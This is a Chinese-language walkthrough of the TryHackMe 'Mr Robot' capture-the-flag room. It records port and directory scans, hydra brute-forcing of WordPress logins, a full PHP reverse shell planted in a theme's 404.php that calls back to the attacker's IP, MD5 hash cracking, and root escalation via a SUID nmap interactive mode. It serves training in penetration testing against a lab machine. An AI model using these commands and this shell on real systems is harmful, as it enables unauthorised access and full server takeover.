## 概述
來源: tryhackme
題目: Mr Robot CTF 
難度: medium
網址: https://tryhackme.com/room/mrrobot

## 基本掃描
### nmap
```!=
nmap -sV -sC -v 10.201.57.96 
```
```!=
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 4d:4c:0e:71:11:ef:b7:17:65:75:b3:b1:c7:73:c9:fc (RSA)
|   256 59:75:a0:14:b7:01:f2:d0:03:2b:0e:c6:bc:43:f9:73 (ECDSA)
|_  256 00:2c:71:8b:1e:9a:4b:8d:6d:9d:00:91:86:e7:c5:c5 (ED25519)
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=www.example.com
| Issuer: commonName=www.example.com
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2015-09-16T10:45:03
| Not valid after:  2025-09-13T10:45:03
| MD5:   3c16:3b19:87c3:42ad:6634:c1c9:d0aa:fb97
|_SHA-1: ef0c:5fa5:931a:09a5:687c:a2c2:80c4:c792:07ce:f71b
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### gobuster url
```!=
└─$ gobuster dir -u http://10.201.57.96:80/ -w /usr/share/seclists/Discovery/Web-Content/common.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.57.96:80/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 218]
/.htaccess            (Status: 403) [Size: 218]
/.hta                 (Status: 403) [Size: 213]
/0                    (Status: 301) [Size: 0] [--> http://10.201.57.96:80/0/]
/Image                (Status: 301) [Size: 0] [--> http://10.201.57.96:80/Image/]
/admin                (Status: 301) [Size: 234] [--> http://10.201.57.96/admin/]
/atom                 (Status: 200) [Size: 623]
/audio                (Status: 301) [Size: 234] [--> http://10.201.57.96/audio/]
/blog                 (Status: 301) [Size: 233] [--> http://10.201.57.96/blog/]
/css                  (Status: 301) [Size: 232] [--> http://10.201.57.96/css/]                                                                          
/dashboard            (Status: 302) [Size: 0] [--> http://10.201.57.96:80/wp-admin/]                                                                    
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 200) [Size: 809]
/image                (Status: 301) [Size: 0] [--> http://10.201.57.96:80/image/]                                                                       
/images               (Status: 301) [Size: 235] [--> http://10.201.57.96/images/]                                                                       
/index.html           (Status: 200) [Size: 1188]
/index.php            (Status: 301) [Size: 0] [--> http://10.201.57.96:80/]
/intro                (Status: 200) [Size: 516314]
/js                   (Status: 301) [Size: 231] [--> http://10.201.57.96/js/]                                                                           
/license              (Status: 200) [Size: 309]
/login                (Status: 302) [Size: 0] [--> http://10.201.57.96:80/wp-login.php]                                                                 
/page1                (Status: 200) [Size: 8249]
/phpmyadmin           (Status: 403) [Size: 94]
/readme               (Status: 200) [Size: 64]
/rdf                  (Status: 200) [Size: 813]
/render/https://www.google.com (Status: 301) [Size: 0] [--> http://10.201.57.96:80/render/https:/www.google.com]                                        
/robots               (Status: 200) [Size: 41]
/robots.txt           (Status: 200) [Size: 41]
/rss                  (Status: 200) [Size: 364]
/rss2                 (Status: 200) [Size: 809]
/sitemap              (Status: 200) [Size: 0]
/sitemap.xml          (Status: 200) [Size: 0]
/video                (Status: 301) [Size: 234] [--> http://10.201.57.96/video/]                                                                        
/wp-admin             (Status: 301) [Size: 237] [--> http://10.201.57.96/wp-admin/]                                                                     
/wp-content           (Status: 301) [Size: 239] [--> http://10.201.57.96/wp-content/]                                                                   
/wp-cron              (Status: 200) [Size: 0]
/wp-config            (Status: 200) [Size: 0]
/wp-includes          (Status: 301) [Size: 240] [--> http://10.201.57.96/wp-includes/]                                                                  
/wp-links-opml        (Status: 200) [Size: 227]
/wp-load              (Status: 200) [Size: 0]
/wp-login             (Status: 200) [Size: 2679]
/wp-mail              (Status: 500) [Size: 3064]
/wp-signup            (Status: 302) [Size: 0] [--> http://10.201.57.96:80/wp-login.php?action=register]                                                 
/wp-settings          (Status: 500) [Size: 0]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc               (Status: 405) [Size: 42]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================
```

## 第一組key
### /robots洩漏資料
訪問`http://10.201.57.96/robots`
```!=
User-agent: *
fsocity.dic
key-1-of-3.txt
```
發現`key-1-of-3.txt`訪問後得到第一組key

## 第二組key
### 洩漏字典檔
發現字典檔`fsocity.dic`
```!=
┌──(kali㉿kali)-[~/tryhackme/mrRobotCtf]
└─$ wc -w fsocity.dic       
858160 fsocity.dic

# 過濾一下重複單字
┌──(kali㉿kali)-[~/tryhackme/mrRobotCtf]
└─$ sort fsocity.dic | uniq > fsocity_unique.dic 

# 瘦身成功
┌──(kali㉿kali)-[~/tryhackme/mrRobotCtf]
└─$ wc -w fsocity_unique.dic 
11451 fsocity_unique.dic
```

### hydra暴力破解
嘗試暴力破解取得有效帳號
```!=
└─$ hydra -L fsocity_unique.dic -p test 10.201.57.96 \
    http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username" \
    -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-21 11:48:07
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 64 tasks per 1 server, overall 64 tasks, 11452 login tries (l:11452/p:1), ~179 tries per task
[DATA] attacking http-post-form://10.201.57.96:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username
[STATUS] 1906.00 tries/min, 1906 tries in 00:01h, 9546 to do in 00:06h, 64 active

[80][http-post-form] host: 10.201.57.96   login: Elliot   password: test
[80][http-post-form] host: 10.201.57.96   login: elliot   password: test
[80][http-post-form] host: 10.201.57.96   login: ELLIOT   password: test
[STATUS] 1896.00 tries/min, 5688 tries in 00:03h, 5764 to do in 00:04h, 64 active
1 of 1 target successfully completed, 3 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-21 11:54:22
```

成功取得帳號 再來嘗試取得該密碼
```!=
└─$ hydra -l elliot -P fsocity_unique.dic 10.201.57.96 \
    http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect" \
    -t 64
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-10-21 11:59:15
[DATA] max 64 tasks per 1 server, overall 64 tasks, 11452 login tries (l:1/p:11452), ~179 tries per task
[DATA] attacking http-post-form://10.201.57.96:80/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=incorrect
[STATUS] 1841.00 tries/min, 1841 tries in 00:01h, 9611 to do in 00:06h, 64 active
[STATUS] 1834.33 tries/min, 5503 tries in 00:03h, 5949 to do in 00:04h, 64 active
[80][http-post-form] host: 10.201.57.96   login: elliot   password: ER28-0652                                                                           
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-10-21 12:02:25
```
登入成功
![image](https://hackmd.io/_uploads/BykvItVRgg.png)

### 上傳php-reverse-shell.php
到`Appearance`>`Editor`修改`404.php`
內容參考
`cat /usr/share/webshells/php/php-reverse-shell.php`
```!=
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '10.4.11.38';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
        // Fork and have the parent process exit
        $pid = pcntl_fork();

        if ($pid == -1) {
                printit("ERROR: Can't fork");
                exit(1);
        }

        if ($pid) {
                exit(0);  // Parent exits
        }

        // Make the current process a session leader
        // Will only succeed if we forked
        if (posix_setsid() == -1) {
                printit("Error: Can't setsid()");
                exit(1);
        }

        $daemon = 1;
} else {
        printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
        printit("$errstr ($errno)");
        exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
        printit("ERROR: Can't spawn shell");
        exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
        // Check for end of TCP connection
        if (feof($sock)) {
                printit("ERROR: Shell connection terminated");
                break;
        }

        // Check for end of STDOUT
        if (feof($pipes[1])) {
                printit("ERROR: Shell process terminated");
                break;
        }

        // Wait until a command is end down $sock, or some
        // command output is available on STDOUT or STDERR
        $read_a = array($sock, $pipes[1], $pipes[2]);
        $num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

        // If we can read from the TCP socket, send
        // data to process's STDIN
        if (in_array($sock, $read_a)) {
                if ($debug) printit("SOCK READ");
                $input = fread($sock, $chunk_size);
                if ($debug) printit("SOCK: $input");
                fwrite($pipes[0], $input);
        }

        // If we can read from the process's STDOUT
        // send data down tcp connection
        if (in_array($pipes[1], $read_a)) {
                if ($debug) printit("STDOUT READ");
                $input = fread($pipes[1], $chunk_size);
                if ($debug) printit("STDOUT: $input");
                fwrite($sock, $input);
        }

        // If we can read from the process's STDERR
        // send data down tcp connection
        if (in_array($pipes[2], $read_a)) {
                if ($debug) printit("STDERR READ");
                $input = fread($pipes[2], $chunk_size);
                if ($debug) printit("STDERR: $input");
                fwrite($sock, $input);
        }
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
        if (!$daemon) {
                print "$string\n";
        }
}

?> 
```
上傳後監聽PORT
```!=
└─$ nc -nvlp 1234                      
listening on [any] 1234 ...
```
訪問
`http://10.201.57.96/wp-content/themes/twentyfifteen/404.php`
> `twentyfifteen`是在`Appearance`>`Themes`隨便挑一個

取得shell
```!=
└─$ nc -nvlp 1234                      
listening on [any] 1234 ...
connect to [10.4.11.38] from (UNKNOWN) [10.201.57.96] 33274
Linux ip-10-201-57-96 5.15.0-139-generic #149~20.04.1-Ubuntu SMP Wed Apr 16 08:29:56 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
 04:21:27 up  1:09,  0 users,  load average: 0.00, 0.01, 0.14
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1(daemon) gid=1(daemon) groups=1(daemon)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```

穩定shell
```!=
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
daemon@ip-10-201-57-96:/$
```
發現key但沒有權限
```!=
daemon@ip-10-201-57-96:/home/robot$ ls
ls
key-2-of-3.txt  password.raw-md5
daemon@ip-10-201-57-96:/home/robot$ cat key-2-of-3.txt
cat key-2-of-3.txt
cat: key-2-of-3.txt: Permission denied
```
確認後發現需要`robot`權限
```!=
daemon@ip-10-201-57-96:/home/robot$ ls -la
ls -la
total 16
drwxr-xr-x 2 root  root  4096 Nov 13  2015 .
drwxr-xr-x 4 root  root  4096 Jun  2 18:14 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```
找到疑似`robot`的密碼加密檔
```!=
daemon@ip-10-201-57-96:/home/robot$ cat password.raw-md5
cat password.raw-md5
robot:c3fcd3d76192e4007dfb496cca67e13b
```

確認加密方式 
```!=
└─$ hashid c3fcd3d76192e4007dfb496cca67e13b
Analyzing 'c3fcd3d76192e4007dfb496cca67e13b'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

### md5解密
應該是md5加密
嘗試破解
```!=
└─$ hashcat -m 0 -a 0 robot_hash /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
* Device #1: cpu--0x000, 1435/2935 MB (512 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

c3fcd3d76192e4007dfb496cca67e13b:ab...yz
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 0 (MD5)
Hash.Target......: c3fcd3d76192e4007dfb496cca67e13b
Time.Started.....: Tue Oct 21 12:25:01 2025 (0 secs)
Time.Estimated...: Tue Oct 21 12:25:01 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2023.3 kH/s (0.08ms) @ Accel:256 Loops:1 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 40960/14344385 (0.29%)
Rejected.........: 0/40960 (0.00%)
Restore.Point....: 39936/14344385 (0.28%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: promo2007 -> loserface1

Started: Tue Oct 21 12:25:00 2025
Stopped: Tue Oct 21 12:25:03 2025

```
成功取得密碼 並登入成功
```!=
daemon@ip-10-201-57-96:/home/robot$ su robot
su robot
Password: ab...yz

$ id
id
uid=1002(robot) gid=1002(robot) groups=1002(robot)
```
取得第二組key
```!=
$ python3 -c 'import pty; pty.spawn("/bin/bash")'

python3 -c 'import pty; pty.spawn("/bin/bash")'
robot@ip-10-201-57-96:~$ 
robot@ip-10-201-57-96:~$ ls
ls
key-2-of-3.txt  password.raw-md5
robot@ip-10-201-57-96:~$ cat key-2-of-3.txt
cat key-2-of-3.txt
82...59
```

## 提權

### 查看s權限的入口
```!=
robot@ip-10-201-57-96:/home/ubuntu$ find / -perm -4000 -type f 2>/dev/null
find / -perm -4000 -type f 2>/dev/null
/bin/umount
/bin/mount
/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/pkexec
/usr/local/bin/nmap
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```
詳細版本
```!=
robot@ip-10-201-57-96:/home/ubuntu$ find / -perm -u=s -type f 2>/dev/null -ls
find / -perm -u=s -type f 2>/dev/null -ls
     1157     40 -rwsr-xr-x   1 root     root        39144 Apr  9  2024 /bin/umount
     1130     56 -rwsr-xr-x   1 root     root        55528 Apr  9  2024 /bin/mount
     2587     68 -rwsr-xr-x   1 root     root        67816 Apr  9  2024 /bin/su
     9124     68 -rwsr-xr-x   1 root     root        68208 Feb  6  2024 /usr/bin/passwd
     8963     44 -rwsr-xr-x   1 root     root        44784 Feb  6  2024 /usr/bin/newgrp
     9117     52 -rwsr-xr-x   1 root     root        53040 Feb  6  2024 /usr/bin/chsh
     5092     84 -rwsr-xr-x   1 root     root        85064 Feb  6  2024 /usr/bin/chfn
     9123     88 -rwsr-xr-x   1 root     root        88464 Feb  6  2024 /usr/bin/gpasswd
     4484    164 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /usr/bin/sudo
      763     32 -rwsr-xr-x   1 root     root        31032 Feb 21  2022 /usr/bin/pkexec
     4430     20 -rwsr-xr-x   1 root     root        17272 Jun  2 18:23 /usr/local/bin/nmap
    20504    468 -rwsr-xr-x   1 root     root       477672 Apr 11  2025 /usr/lib/openssh/ssh-keysign
     6761     16 -rwsr-xr-x   1 root     root        14488 Jul  8  2019 /usr/lib/eject/dmcrypt-get-device
   150122     24 -rwsr-xr-x   1 root     root        22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
   395259     12 -r-sr-xr-x   1 root     root         9532 Nov 13  2015 /usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
   395286     16 -r-sr-xr-x   1 root     root        14320 Nov 13  2015 /usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
   783960     52 -rwsr-xr--   1 root     messagebus    51344 Oct 25  2022 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

### nmap提權
嘗試從nmap下手先確認版本
結果意外的直接進入互動(Interactive)模式
```!=
robot@ip-10-201-57-96:/home/ubuntu$ /usr/local/bin/nmap --version
/usr/local/bin/nmap --version
Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> 
```
嘗試提權，成功取得root權限
```!=
nmap> !bash
!bash
root@ip-10-201-57-96:/home/ubuntu# id
id
uid=0(root) gid=0(root) groups=0(root),1002(robot)
```
取得第三組key
```!=
root@ip-10-201-57-96:/home/ubuntu# cd /root/
cd /root/
root@ip-10-201-57-96:/root# ls
ls
firstboot_done  key-3-of-3.txt
root@ip-10-201-57-96:/root# cat key-3-of-3.txt
cat key-3-of-3.txt
04...e4
```
